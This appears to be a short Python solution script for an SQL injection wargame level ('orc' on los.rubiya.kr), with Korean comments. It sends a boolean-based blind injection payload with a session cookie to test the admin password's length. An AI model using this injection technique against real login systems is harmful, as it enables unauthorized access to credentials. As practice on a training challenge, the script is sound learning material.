import requests
from urllib import parse

host = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="

# cookie를 넣어야하는듯?
# 안넣으면 request가 안됨..
cookies = {"PHPSESSID" : "8s7khiq67rue3qlsffsskni093"}

print("password length find start !! ")
# 패스워드 길이 확인
param = "'||id='admin' and length(pw) = 8 -- -"
res = requests.get(host + parse.quote(param), cookies=cookies)
print(res.text)
if "admin" in res.text :
    print("password length is 8")